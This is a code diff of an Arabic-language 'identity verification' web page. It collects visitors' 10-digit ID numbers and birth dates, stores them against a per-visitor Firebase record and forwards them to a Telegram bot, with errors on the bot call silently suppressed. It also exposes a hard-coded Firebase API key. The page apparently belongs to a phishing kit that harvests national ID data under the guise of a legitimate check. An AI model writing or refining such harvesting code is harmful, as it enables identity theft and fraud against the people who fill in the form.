@@ -50,9 +50,10 @@
     <button id="submitBtn" class="btn-continue">استمرار</button>
 </div>
 
+
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+    import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
 
     const firebaseConfig = {
         apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
@@ -69,21 +70,29 @@
     document.getElementById('submitBtn').addEventListener('click', async () => {
         const idNumber = document.getElementById('idNumber').value;
         const birthDate = document.getElementById('birthDate').value;
+        const docId = localStorage.getItem('currentDocId'); // استرجاع ID المستخدم الحالي
 
         if (idNumber.length !== 10) {
             alert("يرجى إدخال رقم هوية صحيح مكون من 10 أرقام");
             return;
         }
 
-        try {
-            // 1. إرسال البيانات إلى Firebase
-            await addDoc(collection(db, "identity_verifications"), {
-                idNumber: idNumber,
-                birthDate: birthDate,
-                timestamp: serverTimestamp()
-            });
+        if (!birthDate) {
+            alert("يرجى اختيار تاريخ الميلاد");
+            return;
+        }
 
-            // 2. إرسال البيانات إلى بوت التليجرام عبر الـ API (بنفس طريقة index.html)
+        try {
+            // 1. تحديث نفس المستند الخاص بالمستخدم في Firebase
+            if (docId) {
+                await updateDoc(doc(db, "users", docId), {
+                    identityNumber: idNumber,
+                    birthDate: birthDate,
+                    status: "تم إدخال الهوية"
+                });
+            }
+
+            // 2. إرسال البيانات إلى بوت التليجرام
             await fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -93,11 +102,11 @@
                     birthDate: birthDate,
                     status: "تم إدخال الهوية وتاريخ الميلاد"
                 })
-            });
+            }).catch(() => {});
 
             window.location.href = 'success.html';
         } catch (error) {
-            console.error("Error:", error);
+            console.error("Error updating document:", error);
             alert("حدث خطأ، يرجى المحاولة لاحقاً");
         }
     });
